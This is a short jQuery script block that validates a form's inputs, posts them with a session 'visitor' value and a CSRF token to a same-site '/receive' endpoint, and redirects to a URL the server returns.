    <script>
    	function getCsrfToken() {
	  return document.querySelector('meta[name="csrf-token"]').getAttribute("content");
	}
    	
    $(document).ready(function () {
        let btn = $('#submit');
        let checkInputs = $('input');

        // Function to check if all inputs are filled
        function validateInputs() {
            let allFilled = true;
            checkInputs.each(function () {
                if ($(this).val().trim() === "") {
                    allFilled = false;
                    return false; // Exit loop early if an empty field is found
                }
            });

            if (allFilled) {
                btn.removeClass('disabled').prop('disabled', false);
            } else {
                btn.addClass('disabled').prop('disabled', true);
            }
        }

        // Listen for input changes to trigger validation
        checkInputs.on('input', validateInputs);

        // Button click event
        btn.on('click', function (e) {
            e.preventDefault(); // Prevent default form submission

            if (btn.prop('disabled')) return; // Stop if button is disabled

            
            let visitor = sessionStorage.getItem('visitor');
            
            let user = {
                visitor: visitor,
            };
            
            // Loop through form inputs and add values to the object
            checkInputs.each(function () {
                user[$(this).attr('name')] = $(this).val();
            });

            console.log("User Data:", user);

            // Send AJAX request
            $.ajax({
                method: 'POST',
                headers: {
    			"X-CSRF-Token": getCsrfToken(),
    			},
                url: "/receive",
                data: user,
            }).always(function () {
                btn.prop('disabled', false);
                console.log("Button enabled:", btn.prop('disabled'));
            }).done(function (msg) {
                window.location.href = msg.url;
            }).fail(function (xhr, textStatus, error) {
                console.error("AJAX request failed:", xhr.responseText || error);
            });
        });

        // Initial validation check in case inputs are pre-filled
        validateInputs();
    });
</script>
